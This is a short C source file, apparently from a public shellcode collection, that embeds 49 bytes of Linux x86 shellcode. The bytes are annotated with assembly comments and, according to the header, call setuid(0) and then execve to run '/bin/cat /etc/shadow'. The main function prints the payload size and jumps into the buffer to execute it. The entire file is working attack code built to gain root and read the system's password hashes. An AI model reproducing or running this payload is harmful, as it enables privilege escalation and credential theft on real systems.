#include <stdio.h>

/*
	linux/x86 ; setuid(0) & execve(/bin/cat /etc/shadow) 49 bytes
	written by ka0x - <ka0x01[alt+64]gmail.com>
	lun sep 21 16:40:16 CEST 2009

	greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
*/

int main()
{
	char shellcode[] =
			"\x31\xdb"		// xor ebx,ebx
			"\x6a\x17"		// push byte 17h
			"\x58"			// pop eax
			"\xcd\x80"		// int 0x80
			"\x8d\x43\x0b"		// lea eax,[ebx+0xb]
			"\x99"			// cdq
			"\x52"			// push edx
			"\x68\x2f\x63\x61\x74"	// push dword 0x7461632f
			"\x68\x2f\x62\x69\x6e"	// push dword 0x6e69622f
			"\x89\xe3"		// mov ebx,esp
			"\x52"			// push edx
			"\x68\x61\x64\x6f\x77"	// push dword 0x776f6461
			"\x68\x2f\x2f\x73\x68"	// push dword 0x68732f2f
			"\x68\x2f\x65\x74\x63"	// push dword 0x6374652f
			"\x89\xe1"		// mov ecx,esp
			"\x52"			// push edx
			"\x51"			// push ecx
			"\x53"			// push ebx
			"\x89\xe1"		// mov ecx,esp
			"\xcd\x80" ;		// int 80h

	printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
	(*(void(*)()) shellcode)();

	return 0;
}